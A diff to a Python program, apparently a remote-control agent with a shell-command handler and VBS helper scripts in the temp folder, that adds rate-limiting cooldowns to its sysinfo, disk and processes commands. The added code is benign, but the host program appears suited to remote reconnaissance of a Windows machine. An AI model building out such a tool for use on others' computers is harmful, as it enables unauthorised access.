@@ -61,6 +61,14 @@ current_inactivity_threshold = INACTIVITY_THRESHOLD_SECONDS
 mimetic_active = False
 mimetic_log = []
 
+# Command cooldowns (seconds between executions)
+command_cooldowns = {
+    'disk': 2,      # 2 seconds between disk queries
+    'processes': 3, # 3 seconds between process listings
+    'sysinfo': 3,   # 3 seconds between sysinfo queries
+}
+last_command_exec = {}  # Tracks last execution time for each command
+
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
 
@@ -502,6 +510,25 @@ def format_size(bytes_size):
         return f"{bytes_size / (1024 * 1024 * 1024):.1f}GB"
 
 
+def check_command_cooldown(cmd_name):
+    global last_command_exec
+
+    if cmd_name not in command_cooldowns:
+        return True, 0  # No cooldown for this command
+
+    cooldown_required = command_cooldowns[cmd_name]
+    last_exec = last_command_exec.get(cmd_name, 0)
+    time_since_last = time.time() - last_exec
+
+    if time_since_last < cooldown_required:
+        wait_time = cooldown_required - time_since_last
+        return False, wait_time
+
+    # Update last execution time
+    last_command_exec[cmd_name] = time.time()
+    return True, 0
+
+
 def execute_shell_command(cmd_str):
     global current_working_dir
     global clipboard_file
@@ -914,6 +941,9 @@ def execute_shell_command(cmd_str):
 
         # Handle sysinfo command
         if cmd_lower == "sysinfo":
+            allowed, wait_time = check_command_cooldown('sysinfo')
+            if not allowed:
+                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
             try:
                 result = subprocess.run(["systeminfo"], capture_output=True, text=True, timeout=10)
                 return result.stdout.strip() if result.stdout else "Unable to retrieve system info"
@@ -922,6 +952,9 @@ def execute_shell_command(cmd_str):
 
         # Handle disk command (with optional disk number parameter)
         if cmd_lower.startswith("disk"):
+            allowed, wait_time = check_command_cooldown('disk')
+            if not allowed:
+                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
             try:
                 import shutil
                 import string
@@ -957,6 +990,9 @@ def execute_shell_command(cmd_str):
 
         # Handle processes command - show running processes (main process only)
         if cmd_lower == "processes":
+            allowed, wait_time = check_command_cooldown('processes')
+            if not allowed:
+                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
             try:
                 # Execute tasklist twice for reliability (first attempt often fails)
                 result = None
